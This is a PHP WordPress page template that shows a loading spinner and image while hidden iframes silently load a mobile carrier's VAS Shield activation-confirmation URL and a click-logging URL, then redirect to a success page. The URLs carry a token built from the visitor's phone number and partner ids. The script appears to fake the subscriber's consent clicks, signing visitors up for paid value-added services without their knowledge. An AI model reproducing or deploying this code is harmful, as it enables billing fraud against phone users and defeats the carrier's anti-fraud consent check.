<?php

use Wordpress\Multisite\Commons\Decorator\GetPost;
use Wordpress\Multisite\Commons\Support\Facades\Log;
use Wordpress\Multisite\Commons\Support\Facades\Session;
use Wordpress\Multisite\Commons\MarketingCustomization\Flow;
use Wordpress\Multisite\Commons\Support\Facades\PrepareResponse;

$obj = PrepareResponse::getAll();


$obj = PrepareResponse::getAll();

$link = $obj->link;
if (!$obj->flowParams) {
    header('Location:'.$link);
}
$accessId = $obj->flowParams->accessId;
$hubattivoid = $obj->flowParams->hubattivoid;
$spVasShield = $obj->flowParams->spVasShield;
$cpVasShield = $obj->flowParams->cpVasShield;
$vasShieldCaring = $obj->flowParams->vasShieldCaring;
$caringPageIdNotOk = "";
$partnerId = $obj->flowParams->partnerId;
$pageId = $obj->flowParams->pageId;
$msisdn = $obj->flowParams->msisdn;

$now = new DateTime();
$now = $now->format('YmdHmsv');
$randomN = rand(200000,700000);

$urlOk = $obj->flowParams->urlOk;

$tid = $now . ':' . $randomN;

$bytes = openssl_random_pseudo_bytes(32);
$tk = substr(bin2hex($bytes), 0, 10);
$finalTk = substr($tk, 8, 2);


$Token = urlencode(str_replace('==','',base64_encode(utf8_encode($hubattivoid.'_'.$finalTk.'_'.$partnerId.'_'.$finalTk.'_'.$msisdn))));

$secondClick = "http://sdc.tre.it/p-sdc/m-site/ActiveHub/clickLoger?tid=$tid&sp=$spVasShield&cp=$cpVasShield&tk=$tk&pk=$Token&lp=$vasShieldCaring&ep=$caringPageIdNotOk&sid=$hubattivoid&accessId=$accessId";

$firstClick = "http://sdc.tre.it/p-sdc/m-site/ActiveHub/VasShieldConfirmActivation_H?tid=$tid&sp=$spVasShield&cp=$cpVasShield&tk=$tk&pk=$Token&lp=$vasShieldCaring&ep=$caringPageIdNotOk&sid=$hubattivoid&accessId=$accessId";


# get background image
$backgroundImage = Flow::instance()->getPostCustomImage(654, 368, Flow::instance()->getPostImage(654, 368));



?>

<!DOCTYPE html>
<html>
	<head>
		<meta charset="ISO-8859-1">
		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, minimal-ui, user-scalable=no" />
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
		<meta name="referrer" content="no-referrer">
		<style>
			#modal-handy, #header, .textwidget {
			    display: none !important;
			}
			#container {
			    position: absolute;
			    right:0;
			    left: 0;
			    margin: auto;
			}
			.loadingSpin{
			    margin:20% auto;
			    width:90%;
			}
			.loadingSpin img {
			    width:50px;
			}
			#loading {
			    font-size: 14px;
			    padding:10px;
			    color:#e3e3e3;
			    text-shadow:0 0 2px #000;
			}
			#postImg img{
			    width:100%;
			}
			#iframe0 {
				display: none !important;
			}
			.ytp-spinner{position:relative;width:64px;z-index:18;pointer-events:none;margin:0 auto;}.ytp-spinner-container{pointer-events:none;position:absolute;width:100%;padding-bottom:100%;top:50%;left:50%;margin-top:-50%;margin-left:-50%;animation:ytp-spinner-linspin 1.568s linear infinite;-webkit-animation:ytp-spinner-linspin 1.568s linear infinite}.ytp-spinner-rotator{position:absolute;width:100%;height:100%;-webkit-animation:ytp-spinner-easespin 5332ms cubic-bezier(.4,0,.2,1) infinite both;animation:ytp-spinner-easespin 5332ms cubic-bezier(.4,0,.2,1) infinite both}.ytp-spinner-left{position:absolute;top:0;left:0;bottom:0;overflow:hidden}.ytp-spinner-right{position:absolute;top:0;right:0;bottom:0;overflow:hidden}.ytp-spinner-left{right:49%}.ytp-spinner-right{left:49%}.ytp-spinner-circle{box-sizing:border-box;position:absolute;width:200%;height:100%;border-style:solid;border-color:#ddd #ddd transparent;border-radius:50%;border-width:6px}.ytp-spinner-left .ytp-spinner-circle{left:0;right:-100%;border-right-color:transparent;-webkit-animation:ytp-spinner-left-spin 1333ms cubic-bezier(.4,0,.2,1) infinite both;animation:ytp-spinner-left-spin 1333ms cubic-bezier(.4,0,.2,1) infinite both}.ytp-spinner-right .ytp-spinner-circle{left:-100%;right:0;border-left-color:transparent;-webkit-animation:ytp-right-spin 1333ms cubic-bezier(.4,0,.2,1) infinite both;animation:ytp-right-spin 1333ms cubic-bezier(.4,0,.2,1) infinite both}@-webkit-keyframes ytp-spinner-linspin{to{-webkit-transform:rotate(360deg)}}@keyframes ytp-spinner-linspin{to{transform:rotate(360deg)}}@-webkit-keyframes ytp-spinner-easespin{12.5%{-webkit-transform:rotate(135deg)}25%{-webkit-transform:rotate(270deg)}37.5%{-webkit-transform:rotate(405deg)}50%{-webkit-transform:rotate(540deg)}62.5%{-webkit-transform:rotate(675deg)}75%{-webkit-transform:rotate(810deg)}87.5%{-webkit-transform:rotate(945deg)}to{-webkit-transform:rotate(1080deg)}}@keyframes ytp-spinner-easespin{12.5%{transform:rotate(135deg)}25%{transform:rotate(270deg)}37.5%{transform:rotate(405deg)}50%{transform:rotate(540deg)}62.5%{transform:rotate(675deg)}75%{transform:rotate(810deg)}87.5%{transform:rotate(945deg)}to{transform:rotate(1080deg)}}@-webkit-keyframes ytp-spinner-left-spin{0%{-webkit-transform:rotate(130deg)}50%{-webkit-transform:rotate(-5deg)}to{-webkit-transform:rotate(130deg)}}@keyframes ytp-spinner-left-spin{0%{transform:rotate(130deg)}50%{transform:rotate(-5deg)}to{transform:rotate(130deg)}}@-webkit-keyframes ytp-right-spin{0%{-webkit-transform:rotate(-130deg)}50%{-webkit-transform:rotate(5deg)}to{-webkit-transform:rotate(-130deg)}}@keyframes ytp-right-spin{0%{transform:rotate(-130deg)}50%{transform:rotate(5deg)}to{transform:rotate(-130deg)}}
			#iframe1, #iframe2 {
				display: none !important;
			}
		</style>
		<?php wp_head(); ?>
	</head>
	<body>
		<div id="container">
		    <div class="loadingSpin">
		    	<div class="ytp-spinner" data-layer="4">
					<div>
						<div class="ytp-spinner-container">
							<div class="ytp-spinner-rotator">
								<div class="ytp-spinner-left">
									<div class="ytp-spinner-circle"></div>
								</div>
								<div class="ytp-spinner-right">
									<div class="ytp-spinner-circle"></div>
								</div>
							</div>
						</div>
					</div>
				</div>
		    </div>
		</div>
		<div id="postImg">
		    <img src="<?php echo $backgroundImage; ?>" />
		</div>

		<iframe src="<?php echo $link ?>" id="iframe0" referrerpolicy="no-referrer-when-downgrade" height="500px"></iframe>
		<iframe src="" id="iframe1" referrerpolicy="no-referrer-when-downgrade"></iframe>
		<iframe src="" id="iframe2" referrerpolicy="no-referrer-when-downgrade"></iframe>

		
		<script type="text/javascript">
			$('#iframe0').on('load', function(){
				$('#iframe1').attr('src', '<?php echo $firstClick; ?>');
				$('#iframe1').on('load', function(){
					setTimeout(function(){
						$('#iframe2').attr('src', '<?php echo $secondClick; ?>');
						$('#iframe2').on('load', function(){
							setTimeout(function(){
								window.location.href = '<?php echo $urlOk; ?>';
							},1000);
						});
					},1000);
				});
			});
		</script>
	</body>
	</html>